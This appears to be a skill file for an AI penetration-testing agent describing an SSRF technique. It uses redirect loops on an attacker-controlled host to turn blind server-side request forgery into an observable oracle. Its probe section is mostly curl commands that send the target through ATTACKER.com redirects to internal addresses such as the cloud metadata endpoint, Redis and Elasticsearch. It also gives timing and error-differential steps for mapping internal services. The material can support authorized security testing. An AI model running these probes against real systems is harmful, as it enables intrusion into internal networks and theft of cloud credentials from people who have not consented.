---
name: ssrf-redirect-loop
description: Upgrade blind SSRF to visible using HTTP redirect loops and error differential analysis. Use when blind SSRF confirmed but response content not observable.
---

# SSRF Redirect Loop

## Pattern
- Blind SSRF confirmed: URL parameter accepted, no response content returned
- Server follows HTTP redirects (3xx) on fetched URLs
- Webhook/callback URL fields, PDF generators, image fetchers
- Need to prove impact beyond "blind" (e.g. reach metadata services)

## Probe

### 1. Confirm redirect following
```bash
# Set up redirect loop server (minimal Flask):
# @app.route('/a') -> redirect('/b'), @app.route('/b') -> redirect('/a')
# Submit loop URL as SSRF payload and measure timing
time curl -s "https://target.com/fetch?url=https://ATTACKER.com/a" -o /dev/null
# Compare with non-redirect URL timing as baseline
time curl -s "https://target.com/fetch?url=https://ATTACKER.com/static" -o /dev/null
```

**Checkpoint:** If response time does NOT increase with the redirect loop, the server may not follow redirects. Try 301/302/307/308 variants. If none work, this technique is not applicable.

### 2. Differential analysis
```bash
# Inject internal target mid-chain: A -> internal_target -> B -> A
# Compare responses for different internal targets:
curl -s "https://target.com/fetch?url=https://ATTACKER.com/redir?to=http://169.254.169.254/latest/meta-data/"
curl -s "https://target.com/fetch?url=https://ATTACKER.com/redir?to=http://10.0.0.1:6379/"
curl -s "https://target.com/fetch?url=https://ATTACKER.com/redir?to=http://localhost:9200/"
```

Different internal targets produce different error types, timing, or status codes — each serves as an oracle channel:
- `169.254.169.254` → connection timeout vs auth error (reveals metadata service exists)
- Internal host → `NetworkException` vs `JSONParseException` (reveals service type)

## Indicators
- Response time scales with redirect chain depth (confirms redirect following)
- Different exception types for different internal targets
- Status code or error message changes when internal service responds differently

## Chain With
- ssti-error-based-detection (SSRF to internal template rendering service)

## Reference
https://slcyber.io/research-center/novel-ssrf-technique-involving-http-redirect-loops/
